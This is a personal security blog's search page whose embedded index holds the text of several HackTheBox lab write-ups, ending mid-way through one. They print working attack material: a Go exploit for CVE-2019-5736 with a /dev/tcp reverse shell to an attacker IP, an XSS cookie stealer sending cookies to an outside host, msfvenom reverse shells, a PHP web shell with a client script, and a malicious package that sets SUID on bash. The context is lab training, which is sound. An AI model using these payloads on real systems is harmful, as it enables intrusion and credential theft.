<!DOCTYPE html>
<html lang="en">
<head>
<title>Search :: RoundofThree</title>
<meta content="text/html; charset=utf-8" http-equiv="content-type"/>
<meta content="width=device-width, initial-scale=1.0" name="viewport"/>
<meta content="" name="description"/>
<meta content="[hacking kaggle blog resume hackthebox machine-learning reverse-engineering infosec]" name="keywords"/>
<meta content="noodp" name="robots"/>
<link href="/search/" rel="canonical"/>
<link href="/assets/style.css" rel="stylesheet"/>
<link href="/img/apple-touch-icon-192x192.png" rel="apple-touch-icon"/>
<link href="/favicon.png" rel="shortcut icon"/>
<meta content="summary" name="twitter:card"/>
<meta content="" name="twitter:site"/>
<meta content="" name="twitter:creator"/>
<meta content="en" property="og:locale"/>
<meta content="website" property="og:type"/>
<meta content="Search" property="og:title"/>
<meta content="" property="og:description"/>
<meta content="/search/" property="og:url"/>
<meta content="RoundofThree" property="og:site_name"/>
<meta content="/favicon.png" property="og:image"/>
<meta content="2048" property="og:image:width"/>
<meta content="1024" property="og:image:height"/>
<link href="/search/index.xml" rel="alternate" title="RoundofThree" type="application/rss+xml"/>
</head>
<body class="orange">
<div class="container center headings--one-size">
<header class="header">
<div class="header__inner">
<div class="header__logo">
<a href="/">
<div class="logo">
    RoundofThree
  </div>
</a>
</div>
<div class="menu-trigger">menu</div>
</div>
<nav class="menu">
<ul class="menu__inner menu__inner--desktop">
<li><a href="/general">General</a></li>
<li><a href="/labs">Labs</a></li>
<li><a href="/research">Research</a></li>
<li><a href="/">Whoami</a></li>
</ul>
<ul class="menu__inner menu__inner--mobile">
<li><a href="/general">General</a></li>
<li><a href="/labs">Labs</a></li>
<li><a href="/research">Research</a></li>
<li><a href="/">Whoami</a></li>
</ul>
</nav>
</header>
<form action="/search/" id="search" method="get">
<label for="search-input" hidden="">Search site</label>
<input id="search-input" name="query" placeholder="Type here to search" type="text"/>
<input type="submit" value="search"/>
</form>
<div class="content">
<ul id="results">
<li>
        Enter a keyword above to search this site.
    </li>
</ul>
<script>
    window.store = {
        
        
        
        
        "\/tags\/hackthebox\/": {
            
            "title": "HackTheBox",
            "tags": [],
            "content": "", 
            "url": "\/tags\/hackthebox\/"
        },
        
        
        
        "\/labs\/": {
            
            "title": "Labs",
            "tags": [],
            "content": "", 
            "url": "\/labs\/"
        },
        
        
        
        "\/tags\/": {
            
            "title": "Tags",
            "tags": [],
            "content": "", 
            "url": "\/tags\/"
        },
        
        
        
        "\/labs\/the_notebook\/": {
            
            "title": "The Notebook - HackTheBox machine",
            "tags": ["HackTheBox",],
            "content": "Foothold 1- Nmap finds open ports 22 and 80, filtered port 10010/tcp filtered rxapi.\n2- Web is a notekeeper CRUD website. On the login page, I found that I can enumerate usernames because it tells me the reason auth failed: there is a user called \u0026lsquo;admin\u0026rsquo;.\n3- Register an account, and look at the cookies: auth and uuid. Auth cookie seems a JWT token. Decode and find:\nHeader: { \u0026#34;typ\u0026#34;: \u0026#34;JWT\u0026#34;, \u0026#34;alg\u0026#34;: \u0026#34;RS256\u0026#34;, \u0026#34;kid\u0026#34;: \u0026#34;http://localhost:7070/privKey.key\u0026#34; \u0026lt;- private key } Payload: { \u0026#34;username\u0026#34;: \u0026#34;anna\u0026#34;, \u0026#34;email\u0026#34;: \u0026#34;anna@gmail.com\u0026#34;, \u0026#34;admin_cap\u0026#34;: 0 \u0026lt;-- change to 1 } 4- So I need access to the private key. Or I can change the \u0026lsquo;kid\u0026rsquo; field to my own IP.\nopenssl genrsa -out privKey.key 4028 python3 -m http.server 7070 5- There are interesting notes in Admin panel.\n Need to fix config. PHP can be executed. There are backup tasks. There is a user named noah.  6- Upload a PHP pw0ny shell and view it to remote code execution.\n7- Download backup of home tarball and use the .ssh id_rsa to ssh into noah session. -\u0026gt; user.txt get!\nPrivilege escalation 8- sudo -l to find access to sudo docker exec -it webapp-dev01 ANY COMMAND\n9- Use this PoC CVE-2019-5736 in main.go to get a reverse shell from root.\npackage main // Implementation of CVE-2019-5736 // Created with help from @singe, @_cablethief, and @feexd. // This commit also helped a ton to understand the vuln // https://github.com/lxc/lxc/commit/6400238d08cdf1ca20d49bafb85f4e224348bf9d import ( \u0026#34;fmt\u0026#34; \u0026#34;io/ioutil\u0026#34; \u0026#34;os\u0026#34; \u0026#34;strconv\u0026#34; \u0026#34;strings\u0026#34; ) // This is the line of shell commands that will execute on the host // var payload = \u0026#34;#!/bin/bash \\n cat /etc/shadow \u0026gt; /tmp/shadow \u0026amp;\u0026amp; chmod 777 /tmp/shadow\u0026#34; var payload = \u0026#34;#!/bin/bash \\n bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.14.129/9999 0\u0026gt;\u0026amp;1\u0026#34; func main() { // First we overwrite /bin/sh with the /proc/self/exe interpreter path \tfd, err := os.Create(\u0026#34;/bin/sh\u0026#34;) if err != nil { fmt.Println(err) return } fmt.Fprintln(fd, \u0026#34;#!/proc/self/exe\u0026#34;) err = fd.Close() if err != nil { fmt.Println(err) return } fmt.Println(\u0026#34;[+] Overwritten /bin/sh successfully\u0026#34;) // Loop through all processes to find one whose cmdline includes runcinit \t// This will be the process created by runc \tvar found int for found == 0 { pids, err := ioutil.ReadDir(\u0026#34;/proc\u0026#34;) if err != nil { fmt.Println(err) return } for _, f := range pids { fbytes, _ := ioutil.ReadFile(\u0026#34;/proc/\u0026#34; + f.Name() + \u0026#34;/cmdline\u0026#34;) fstring := string(fbytes) if strings.Contains(fstring, \u0026#34;runc\u0026#34;) { fmt.Println(\u0026#34;[+] Found the PID:\u0026#34;, f.Name()) found, err = strconv.Atoi(f.Name()) if err != nil { fmt.Println(err) return } } } } // We will use the pid to get a file handle for runc on the host. \tvar handleFd = -1 for handleFd == -1 { // Note, you do not need to use the O_PATH flag for the exploit to work. \thandle, _ := os.OpenFile(\u0026#34;/proc/\u0026#34;+strconv.Itoa(found)+\u0026#34;/exe\u0026#34;, os.O_RDONLY, 0777) if int(handle.Fd()) \u0026gt; 0 { handleFd = int(handle.Fd()) } } fmt.Println(\u0026#34;[+] Successfully got the file handle\u0026#34;) // Now that we have the file handle, lets write to the runc binary and overwrite it \t// It will maintain it\u0026#39;s executable flag \tfor { writeHandle, _ := os.OpenFile(\u0026#34;/proc/self/fd/\u0026#34;+strconv.Itoa(handleFd), os.O_WRONLY|os.O_TRUNC, 0700) if int(writeHandle.Fd()) \u0026gt; 0 { fmt.Println(\u0026#34;[+] Successfully got write handle\u0026#34;, writeHandle) writeHandle.Write([]byte(payload)) return } } } ", 
            "url": "\/labs\/the_notebook\/"
        },
        
        
        
        "\/": {
            
            "title": "Whoami",
            "tags": [],
            "content": "RoundofThree (Zhuo Ying Jiang Li)  Email: zhuoyingjiangli@gmail.com Github HackTheBox. Rank: Pro Hacker. Global ranking (last updated 2021/09/05): 504 Leetcode. Ranking (last updated 2021/09/05): 3691 CV.pdf  Introduction I\u0026rsquo;m\nCoding in Golang, Python \u0026hellip;\nHacking in HackTheBox, Leetcode, Kaggle \u0026hellip;\nReading all things about infosec \u0026hellip;\nPlaying Genshin \u0026hellip;\nLoving ACG!\nSkills  In descending order of proficiency: Python, Golang, C++, Rust, Ruby, Java Web backend: Golang Gin, Ruby on Rails, Express Scripting: Python, Golang Windows Internals and forensics   Malware analysis (maldocs, js, powershell) and reverse engineering assembly Pentesting vulnerable boxes and networks at HackTheBox ML: Tensorflow, XGBoost, LightGBM, Optuna Artificial Intelligence Planning: PDDL Web frontend: VueJS 3, React Mobile app: React Native LaTex  Projects  Hacker tools and exploits  HTB machines writeups (encrypted) Automated baselining (Batchfile)   Web/Software development  MapReduce minimal implementation in Golang (MIT Distributed Systems 6.824). See official course page. Raft implementation in Golang (MIT Distributed Systems 6.824) Nyxeon (Golang Gin + VueJS 3 first project) King\u0026rsquo;s College London Chinese Alumni Association website CMS API and online payment (Ruby on Rails). Private. Online health monitoring and scheduling system (Ruby on Rails). School project. King\u0026rsquo;s College London Chinese Student Association WeChat miniprogram. Private. Bank scam honeypot web application (Ruby on Rails). School project. AirBnB market listing desktop application (JavaFX, first year coursework).   ML \u0026amp; CV \u0026amp; AI algorithms  Kaggle workflow: a template to clean, do feature engineering, model and ensemble (Python) Kaggle competitions repositories and notebooks (Python, ScikitLearn, Tensorflow, XGBoost, LightGBM) Sokoban solver using PDDL (OPTIC solver) Python scripts: watermark removal, DPLL SAT solver\u0026hellip; Google Hashcode: traffic planning (Python)    Experience  Hacker tools, techniques, exploits and incident handling training at SANS Institute GIAC GCIH certified Joined the GIAC Advisory Board King\u0026rsquo;s College London Computer Science First \u0026amp; Second Year Award King\u0026rsquo;s College London Computer Science with Management Award IB 45 points Silver medal at Iberoamerican Chemistry Olympics Silver medals at Spanish National Chemistry and Physics Olympics  ", 
            "url": "\/"
        },
        
        
        
        "\/labs\/seal\/": {
            
            "title": "Seal - HackTheBox machine",
            "tags": ["HackTheBox",],
            "content": " Rank: medium  Part of this article is encrypted with password:\n  --- DON'T MODIFY THIS LINE --- Foothold 1- Nmap found 8080 (http proxy), 22 (ssh), 443 (http nginx)\n2- After visiting seal.htb:8080 redirects to\nhttp://seal.htb:8080/signin;jsessionid=node01tjyqiz7gjnlz10tpoes47xr1g88.node0?redirect=%2F Set-Cookie: JSESSIONID=node0eechasxnr4hcp25y400b85jc53.node0; node0 is repeated. 401 Unauthorized. jsessionid cookie is passed in the url, redirect param is \u0026lsquo;/\u0026rsquo;.\n3- Register an account in Gitbucket and access the source code of the webapp. There are three directories: app, tomcat, nginx. The TODO list mentions:\n3.1- Remove mutual authentication for dashboard, setup registration and login features. \u0026lt;-- what is mutual auth? 3.2- Deploy updated Tomcat confs. \u0026lt;-- look at what updates are pending in the commit diff files. \u0026lt;user username=\u0026quot;tomcat\u0026quot; password=\u0026quot;42MrHBf*z8{Z%\u0026quot; roles=\u0026quot;manager-gui,admin-gui\u0026quot;/\u0026gt; in tomcat-users.xml 3.3- Disable manager and host-manager. \u0026lt;-- what is this?  4- Read about Tomcat. Tomcat has a web interface to manage webapps and deployment, which by default can be accessed at /manager/html. Only tomcat users which have manager-gui role have access.\n5- /manager/html returns 403 Forbidden by nginx. This is due to whitelisting. A bypass to this is directory path traversal. This blog explains how java applications suffer from path normalization vulnerability. https://thehackingfactory.com/dot-dot-semicolon-rce\nSee nginx/sites-enables/default: /manager/html, /host-manager/html, /admin/dashboard require ssl_client_verify to be SUCCESS, but we don\u0026rsquo;t have the client certificate. We can bypass the list with /manager/anything;/..;/html. Nginx sees /manager/anything;/..;/html, but Tomcat sees /manager/anything/../html.\n6- Deploy meterpreter reverse shell WAR file.\nmsfvenom -p java/meterpreter/reverse_tcp LHOST=tun0 LPORT=1234 -f war -o health.war Catch POST packet in Burpsuite and change the url path to bypass the client certificate check by nginx.\n7- Metasploit listen to port 1234. Visit /health.\n8- getuid reveals we are user tomcat. There is a folder named \u0026lsquo;luis\u0026rsquo; in /home folder. tomcat user doesn\u0026rsquo;t have permissions to read user.txt nor .ssh/id_rsa. The existence of .ansible directory hints that there may be some backup task. Explore /opt to find backups/.\nbackups/ --\u0026gt; archives/ --\u0026gt; backup-xxx-xxx.gz --\u0026gt; playbook/ --\u0026gt; run.yml We cannot modify run.yml:\n- hosts: localhost tasks: - name: Copy Files synchronize: src=/var/lib/tomcat9/webapps/ROOT/admin/dashboard dest=/opt/backups/files copy_links=yes - name: Server Backups archive: path: /opt/backups/files/ dest: \u0026#34;/opt/backups/archives/backup-{{ansible_date_time.date}}-{{ansible_date_time.time}}.gz\u0026#34; - name: Clean file: state: absent path: /opt/backups/files/ 8- In run.yml, we can exploit copy_links=yes.\nln -s /home/luis/.ssh/id_rsa /var/lib/tomcat9/webapps/ROOT/admin/dashboard/uploads/id_rsa cp archives/backup-THE-MOST-RECENT-ONE.gz /tmp Download the gz file. file reveals it\u0026rsquo;s a tar gz file \u0026ndash;\u0026gt; tar xvfz backup.tar.gz \u0026ndash;\u0026gt; dashboard/ \u0026ndash;\u0026gt; see uploads/id_rsa\n9- ssh -i id_rsa luis@seal.htb\nPrivilege escalation 10- sudo -l\nSee https://gtfobins.github.io/gtfobins/ansible-playbook/. It\u0026rsquo;s very straighforward since ansible playbook is an automation tool which can run any command.\nroot.txt: 13302f0959a0be8c868a95076136a391\n ", 
            "url": "\/labs\/seal\/"
        },
        
        
        
        "\/labs\/schooled\/": {
            
            "title": "Schooled - HackTheBox machine",
            "tags": ["HackTheBox",],
            "content": " Rank: medium  Foothold 1- nmap discovered 22, 80, 33060 (mysqlx)\n2- Web clues:\n contact.php -\u0026gt; 404 email: admissions@schooled.htb web address schooled.htb -\u0026gt; suggests there can be subdomains  3- Fuzzing vhost.\nwfuzz -c -u \u0026#34;http://schooled.htb/\u0026#34; -H \u0026#34;Host:FUZZ.schooled.htb\u0026#34; -w /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt --hl 461 # (Hide those whose line is 461).  Found moodle.schooled.htb.\n4- Self enroll in Maths. Read announcements. The teacher Manuel Philips will check himself when we set the MoodleNet profile.\n5- Check for XSS in every input (description, chat). Steal the cookie to access higher role (Teacher role). Wait for a long time\u0026hellip;\nBecause the teacher will check for our profile, set the MoodleNet to\n\u0026lt;script\u0026gt;var i=new Image;i.src=\u0026#34;http://10.10.14.23:8888/?\u0026#34;+document.cookie;\u0026lt;/script\u0026gt; Description is not vulnerable.\n10.10.10.234 - - [02/Aug/2021 10:48:40] \u0026quot;GET /?MoodleSession=g6913p6t2kegeg9n1dgee9qm12 HTTP/1.1\u0026quot; 200 - 6- CVE-2020-14321. This vulnerability allows Course enrolments to allow privilege escalation from teacher role into manager role.\nBurpsuite when enrolling a new user. Change userlist param to current account id (24?) and set roletoassign to 1 (manager).\n7- As Liann Carter, go to Site administration page at http://moodle.schooled.htb/moodle/admin/search.php.\nMoodle 3.9 (Build: 20200615). 8- Go to Users / Edit roles / Manager / Edit / Save changes \u0026ndash;\u0026gt; use burpsuite to change everything to 1 (allowed).\n9- Go to Plugins / Install plugins / submit rce.zip and install.\n10- Visit http://moodle.schooled.htb/moodle/blocks/rce/lang/en/block_rce.php to activate the webshell.\n11- Relay a reverse shell with pentestmonket php reverse shell as www-data user.\n12- Cat the apache config to get MySQL credentials.\nfind / -name \u0026#39;config.php\u0026#39; 2\u0026gt;/dev/null # --\u0026gt; /usr/local/www/apache24/data/moodle/config.php 13- Connect to mysql and retrieve all credentials for moodle.\nfind / -name mysql 2\u0026gt;/dev/null # --\u0026gt; /usr/local/bin/mysql  /usr/local/bin/mysql -u moodle --password=PlaybookMaster2020 -e \u0026#39;use moodle; show tables;\u0026#39; # --\u0026gt; found mdl_user /usr/local/bin/mysql -u moodle --password=PlaybookMaster2020 -e \u0026#39;use moodle; select * from mdl_user;\u0026#39; # --\u0026gt; jamie password hash is $2y$10$3D/gznFHdpV6PXt1cLPhX.ViTgs87DCE5KqphQhGYR5GFbcl4qTiW # --\u0026gt; higgins jane -\u0026gt; $2y$10$n9SrsMwmiU.egHN60RleAOauTK2XShvjsCS0tAR6m54hR1Bba6ni2 # --\u0026gt; manuel philips -\u0026gt; $2y$10$ZwxEs65Q0gO8rN8zpVGU2eYDvAoVmWYYEhHBPovIHr8HZGBvEYEYG # --\u0026gt; carter lianne -\u0026gt; $2y$10$jw.KgN/SIpG2MAKvW8qdiub67JD7STqIER1VeRvAH4fs/DPF57JZe 14- John crack the credentials.\njohn --wordlist=/opt/SecLists/Passwords/Leaked-Databases/rockyou.txt tocrack.txt 15- SSH into jamie:!QAZ2wsx\nPrivilege escalation 16- sudo -l to find pkg update and pkg install *\n17- Create a custom package that sets the SETUID bit in /bin/bash. See pkg_install.sh.\n#!/bin/sh  STAGEDIR=/root/stage rm -rf ${STAGEDIR} mkdir -p ${STAGEDIR} cat \u0026gt;\u0026gt; ${STAGEDIR}/+PRE_DEINSTALL \u0026lt;\u0026lt;EOF pw usermod -n root -s /bin/sh EOF cat \u0026gt;\u0026gt; ${STAGEDIR}/+POST_INSTALL \u0026lt;\u0026lt;EOF chmod +s /usr/local/bin/bash EOF cat \u0026gt;\u0026gt; ${STAGEDIR}/+MANIFEST \u0026lt;\u0026lt;EOF name: post version: \u0026#34;1.0_1\u0026#34; origin: sysutils/post comment: \u0026#34;Optimize post services\u0026#34; desc: \u0026#34;Optimize post services\u0026#34; maintainer: hutao@gmail.com www: https://mihoyo.com prefix: / EOF mkdir -p ${STAGEDIR}/usr/local/etc echo \u0026#34;# hu\u0026#34; \u0026gt; ${STAGEDIR}/usr/local/etc/my.conf echo \u0026#34;/usr/local/etc/my.conf\u0026#34; \u0026gt; ${STAGEDIR}/plist pkg create -m ${STAGEDIR}/ -r ${STAGEDIR}/ -p ${STAGEDIR}/plist -o . 18- bash -p (this option exploits the SETUID bit if set).\nroot.txt: 85336d96f89869c69d073a90de2730b1\n", 
            "url": "\/labs\/schooled\/"
        },
        
        
        
        "\/labs\/pit\/": {
            
            "title": "Pit - HackTheBox machine",
            "tags": ["HackTheBox",],
            "content": " Rank: medium  Part of this article is encrypted with password:\n  --- DON'T MODIFY THIS LINE --- Foothold 1- Nmap discovered 22, 80, 9090. Port 9090 is an http port for remote connection to CentOS. We have to log in with in the server user account. From ssl port I retrieved the commonName dms-pit.htb. 9090 seems to be zeus-admin service.\nI really shouldn\u0026rsquo;t ignore UDP ports in a pentest\u0026hellip; DNS, SNMP, and DHCP (registered ports 53, 161/162, and 67/68) are juicy ports. Nmap udp ports to check for SNMP, DNS or DHCP.\nnmap -sU -sV -v -oA udpnmap pit.htb 2- Web enumeration:\nnikto -h pit.htb # --\u0026gt; Nginx 1.14.1 from Red Hat Enterprise.  nikto -h pit.htb:9090 # --\u0026gt; No server headers.  http://pit.htb:80 is a Nginx welcome page.\nhttp://pit.htb:9090 is a web system management console, CentOS cockpit (google it)\nhttps://dms-pit.htb is Forbidden 403\nhttps://dms-pit.htb:9090 is the cockpit login page again\nRun some fuzzing in the background.\nffuf -c -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://dms-pit.htb/FUZZ -fc 403 # --\u0026gt; Nothing ffuf -c -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://dms-pit.htb:9090/FUZZ -fs 43548,0,73 # --\u0026gt; /ping /ping returns JSON { \u0026ldquo;service\u0026rdquo;: \u0026ldquo;cockpit\u0026rdquo; }\n3- Check public community string for SNMP.\n snmp-check 10.10.10.241 -p public \u0026ndash;\u0026gt; list of processes, no interesting processes snmpwalk -v 1 -c public 10.10.10.241 NET-SNMP-EXTEND-MIB::nsExtendOutputFull \u0026gt; snmpwalk.txt snmpwalk -v 1 -c public 10.10.10.241 .1 \u0026gt; snmpwalk-all.txt \u0026ndash;\u0026gt; Via manual inspection (vim snmpwalk-all.txt), I found an interesting path: /var/www/html/seeddms51x/seeddms and /usr/bin/monitor. And usernames michelle and root.\n 4- SSH with michelle:michelle but SSH requires public key authentication, sad :(.\n5- Add path /seeddms51x/seeddms to all combinations of hostname and port. Found a DMS login at https://dms-pit.htb/seeddms51x/seeddms. Login with michelle:michelle.\n It runs Seed DMS. There is an upgrade notice that reveals that the Seed DMS is version 5.1.15. There is a Docs folder with two user folders: Michelle and Jack.  The CHANGELOG did mention that there is a security issue. This line:\n  fix for CVE-2019-12744 (Remote Command Execution through unvalidated file upload)   6- Cannot login with hand crafted credentials to CentOS cockpit console.\n7- I am confused. Try to exploit CVE-2019-12744 although the admin should have fixed it according to the CHANGELOG.\nUpload 1.php and access it through http://dms-pit.htb/seeddms51x/data/1048576/32/1.php?cmd=cat+/etc/passwd. Actually, the path is /data/1048576/\u0026lt;documentid\u0026gt;/\u0026lt;version\u0026gt;.\u0026lt;extension\u0026gt;. So I wrote a python webshell: seeddmswebshell.py\npython3 seeddmswebshell.py -u \u0026#39;http://dms-pit.htb/seeddms51x/data/1048576/32/1.php?cmd=\u0026#39; id # uid=992(nginx) gid=988(nginx) groups=988(nginx) context=system_u:system_r:httpd_t:s0 ls /var/www/html/seeddms51x/conf cat /var/www/html/seeddms51x/conf/settings.xml # (see saved settings.xml) 1.php:\n\u0026lt;?php if(isset($_REQUEST[\u0026#39;cmd\u0026#39;])){ echo \u0026#34;\u0026lt;pre\u0026gt;\u0026#34;; $cmd = ($_REQUEST[\u0026#39;cmd\u0026#39;]); system($cmd); echo \u0026#34;\u0026lt;/pre\u0026gt;\u0026#34;; die; } ?\u0026gt;seeddmswebshell.py\n#!/usr/bin/python3 from cmd import Cmd import sys, requests class Webshell(Cmd): def __init__(self, url): super().__init__() self.prompt = \u0026#39;(seeddms)\u0026#39; self.intro = \u0026#39;Be quick! It\\\u0026#39;s not very stable...\u0026#39; self.url = url self.session = requests.Session() def default(self, line): print(f\u0026#34;Making a GET request to {url}\u0026#34;) payload = {\u0026#39;cmd\u0026#39;: line} res = self.session.get(url, params=payload) print(res.text) def do_exit(self, arg): return True if __name__ == \u0026#39;__main__\u0026#39;: if len(sys.argv) \u0026lt; 2 or not \u0026#39;http\u0026#39; in sys.argv[1]: print(\u0026#39;Usage: python3 seeddmswebshell.py \\\u0026#39;http://dms-pit.htb/seeddms51x/data/1048576/32/1.php\\\u0026#39;\u0026#39;) url = sys.argv[1] Webshell(url).cmdloop() 8- There are db creds in settings.xml:\ndbDatabase=\u0026quot;seeddms\u0026quot; dbUser=\u0026quot;seeddms\u0026quot; dbPass=\u0026quot;ied^ieY6xoquu\u0026quot; Try to connect to CentOS cockpit with these creds but failed. Use michelle:ied^ieY6xoquu to\nPrivilege escalation 9- Run linpeas.\n10- Explore /usr/bin/monitor found earlier.\n#!/bin/bash  for script in /usr/local/monitoring/check*sh do /bin/bash $script done Check /usr/local/monitoring.\nls -l /usr/local/monitoring # --\u0026gt; Permission denied. getfacl /usr/local/monitoring getfacl: Removing leading \u0026#39;/\u0026#39; from absolute path names # file: usr/local/monitoring # owner: root # group: root user::rwx user:michelle:-wx group::rwx mask::rwx other::--- michelle can place a script at /usr/local/monitoring which gets executed when SNMP is triggered:\nsnmpwalk -m +MY-MIB -v2c -c public 10.10.10.241 nsExtendObjects Write to /usr/local/monitoring:\ncat \u0026lt;\u0026lt;EOF \u0026gt; /usr/local/monitoring/check_fw.sh #!/bin/bash cp /root/root.txt /tmp/hash.txt EOF For some reason, I get permission denied. Why can\u0026rsquo;t root write to /tmp???\n11- Change the check_fw.sh to put my public key at /root/.ssh/authorized_keys.\nGenerate my public key:\nssh-keygen -t rsa The new check_fw.sh is:\necho \u0026#34;PUBLIC_KEY\u0026#34; \u0026gt; /root/.ssh/authorized_keys Trigger snmp again:\nsnmpwalk -m +MY-MIB -v2c -c public 10.10.10.241 nsExtendObjects ssh -i root root@pit.htb root.txt: b96ee993d16220d6c0c0d519a4179b46\n ", 
            "url": "\/labs\/pit\/"
        },
        
        
        
        "\/labs\/love\/": {
            
            "title": "Love - HackTheBox machine",
            "tags": ["HackTheBox",],
            "content": " Rank: easy  Foothold 1-Usual sudo nmap -sC -sV -oA nmap target to discover ports 80, 443, 135, 139, 445, 5000. I take note of the Apache version and box version Windows 10 Pro 19042. There is also a 3306 port for mysql MariaDB, which says that my IP is not allowed to connect to the DB (Agggh, IP restriction).\n2- I can deduce that the box offers services http, https, MS samba, mysql and an unknown service 5000. The port 5000 service returns 403 Forbidden, probably due to IP restriction. 443 port responds with 403 Forbidden but the ssl-cert reveals a commonName = staging.love.htb\n3- The pivot points left are the Windows version itself (found Unified Remote 3.9.0.2463, not useful here), Apache 2.4.46 (no exploits found except Optionsbleed, not useful here), web on target and staging.love.htb and samba (I am not experienced enough for now).\n4- Open http://target and http://staging.love.htb on browser. Target is a login form for a voting system using PHP, the second one is a webpage to scan urls.\n5- Search for exploits for the software of the voting system in exploitDB. There are two, sqli in the login form and rce when logged in as admin. Also found the source code of the software.\n6- Tried the default admin credentials written in the software docs. No luck. Tried the sqli with Burpsuite, no luck.\n7- Insert http://localhost:5000 in the file url scanner. GOT the admin credentials!\n8- Now having admin account, we can utilise the rce exploit.\nmsfvenom -p php/meterpreter_reverse_shell -f php LHOST=10.10.14.44 LPORT=1234 \u0026gt; shell.php # Could have used a stealthier name hhhh msfconsole use exploit/multi/handler 9- Upload in candidates.php and get a shell. Php shells are not stable, cannot even cd to another dir :(. Use meterpreter to upload an EXE.\nmsfvenom -p windows/x64/meterpreter/reverse_tcp -f exe LHOST and LPORT \u0026gt; update.exe 10- Cannot execute the EXE directly, so let\u0026rsquo;s upload another PHP with the command shell_exec(\u0026lsquo;update.exe\u0026rsquo;);. See anna.php:\n\u0026lt;?php shell_exec(\u0026#39;shell.exe\u0026#39;); ?\u0026gt;11- Now we get a stable user shell!\nPrivilege escalation 12- Definitely smth I need is an automatic checker of common privesc misconfigurations, such as WinPEAS. I tried getsystem with no luck. Use metasploit.\nmsfconsole -q use exploit/windows/local/always_install_elevated set session 1 set LHOST xxxxx exploit 13- GOT NT AUTHORITY/SYSTEM shell.\n", 
            "url": "\/labs\/love\/"
        },
        
        
        
        "\/labs\/knife\/": {
            
            "title": "Knife - HackTheBox machine",
            "tags": ["HackTheBox",],
            "content": " Rank: easy  Foothold  Nmap to find ports 22 and 80. There seems to be no exploit from Apache and OpenSSH versions. Inspect the HTML and the web request. Use nikto to scan. Found PHP version 8 dev, for which there is an exploit in ExploitDB. Get user shell using the backdoor PHP exploit.  Privilege escalation sudo -l to find knife. knife can execute ruby script, so:  sudo knife exec -E \u0026#39;exec \u0026#34;/bin/bash\u0026#34;\u0026#39; Note that we didn\u0026rsquo;t use SSH. Another potential solution would be to bruteforce the SSH connection.\n", 
            "url": "\/labs\/knife\/"
        },
        
        
        
        "\/labs\/intelligence\/": {
            
            "title": "Intelligence - HackTheBox machine",
            "tags": ["HackTheBox",],
            "content": " Rank: medium  Part of this article is encrypted with password:\n  --- DON'T MODIFY THIS LINE --- Foothold 1- Nmap: 53 -\u0026gt; dns 139 -\u0026gt; netbios 445 -\u0026gt; smb 135 -\u0026gt; rpc 593 -\u0026gt; ncacn http, rpc 5985 -\u0026gt; winrm 389, 636, 3268, 3269 -\u0026gt; LDAP, Active Directory is on 88 -\u0026gt; Kerberos, it is a domain controller 464 -\u0026gt; kpasswd5, kerberos password change, not interesting 80 -\u0026gt; web server IIS 10.0 5985 -\u0026gt; Microsoft HTTPAPI, not interesting 9389 -\u0026gt; .NET Message Framing (?)\nServices: samba suite (smbclient, rpcclient), evil-winrm, web, ldap,\nSMB signing is required.\nCN=dc.intelligence.htb\n2- SMB and RPC null session and anonymous session. Successful but no privileges.\nsmbclient -N -U \u0026#34;\u0026#34; -L \\\\intelligence.htb # (and without -U)  rpcclient -N -U \u0026#34;\u0026#34; -L intelligence.htb # (and without -U) 3- LDAP enumeration. Permission denied.\n4- Web enumeration. Contact form is useless. There are 2 PDFs in /documents folder. Name is YYYY-MM-DD-upload.pdf. Scrape them from 2020-01-01 to 2020-12-15. Here is the script I wrote:\n#!/usr/bin/python3  # scrapePdfs.py import requests import os # Convert int to str and pad with 0 if single digit. def padstr(n: int) -\u0026gt; str: if n \u0026lt; 10: return \u0026#39;0\u0026#39; + str(n) else: return str(n) # Download document and save to current directory.  def download(month: int, day: int) -\u0026gt; None: url = \u0026#34;http://intelligence.htb/documents/\u0026#34; filename = f\u0026#34;2020-{padstr(month)}-{padstr(day)}-upload.pdf\u0026#34; # wget and save, if  r = requests.get(url + filename, allow_redirects=True) if r.status_code != 200: raise Exception(\u0026#39;File not found\u0026#39;) else: with open(filename, \u0026#39;wb\u0026#39;) as f: f.write(r.content) def main(): for m in range(1, 13, 1): for d in range(1, 32, 1): try: download(m, d) except: print(f\u0026#34;No file at {padstr(m)}-{padstr(d)}\u0026#34;) if __name__ == \u0026#39;__main__\u0026#39;: main() Find differences in content with pdfcontentdump.py (or go through the content manually). Here is my script to convert pdf to text and combine them to a txt file.\n#!/usr/bin/python3 import io import sys from pdfminer.pdfinterp import PDFResourceManager from pdfminer.layout import LAParams from pdfminer.converter import TextConverter from pdfminer.pdfinterp import PDFPageInterpreter from pdfminer.pdfpage import PDFPage def pdf_to_text(path): with open(path, \u0026#39;rb\u0026#39;) as fp: rsrcmgr = PDFResourceManager() outfp = io.StringIO() laparams = LAParams() device = TextConverter(rsrcmgr, outfp, laparams=laparams) interpreter = PDFPageInterpreter(rsrcmgr, device) for page in PDFPage.get_pages(fp): interpreter.process_page(page) text = outfp.getvalue() return text def main(): outfile = \u0026#39;combinedContent.txt\u0026#39; content = \u0026#39;\u0026#39; for fname in sys.argv[1:]: content += pdf_to_text(fname) # save to outfile with open(outfile, \u0026#39;w\u0026#39;) as f: f.write(content) if __name__ == \u0026#39;__main__\u0026#39;: main() There is a PDF with new account default password (06-04):\nNewIntelligenceCorpUser9876 Searching for common words (like \u0026lsquo;the\u0026rsquo;), I found another interesting piece of text:\nInternal IT Update There has recently been some outages on our [web servers]. [Ted] has gotten a [script] in place to help notify us if this happens again. Also, after discussion following our recent security audit we are in the process of locking down our [service accounts]. 5- From PDFs, extract the potential usernames: scrapeUsers.py. The unique names are at userlist.txt. What I can do is to strip the lastname, toggle capital letters, change dot to underscore.\n#!/usr/bin/python3 import sys import exiftool def main(): files = sys.argv[1:] with exiftool.ExifTool() as et: metadata = et.get_metadata_batch(files) for d in metadata: print(d[\u0026#39;PDF:Creator\u0026#39;]) if __name__ == \u0026#39;__main__\u0026#39;: main() 6- Password spraying with default password:\ncrackmapexec smb intelligence.htb -u userlist.txt -p \u0026#34;NewIntelligenceCorpUser9876\u0026#34; SMB 10.10.10.248 445 DC [+] intelligence.htb\\Tiffany.Molina:NewIntelligenceCorpUser9876 Tiffany.Molina:NewIntelligenceCorpUser9876 7- SMB server via smbclient: Sharename Type Comment │ \u0026mdash;\u0026mdash;\u0026mdash; \u0026mdash;- \u0026mdash;\u0026mdash;- │ ADMIN$ Disk Remote Admin │ 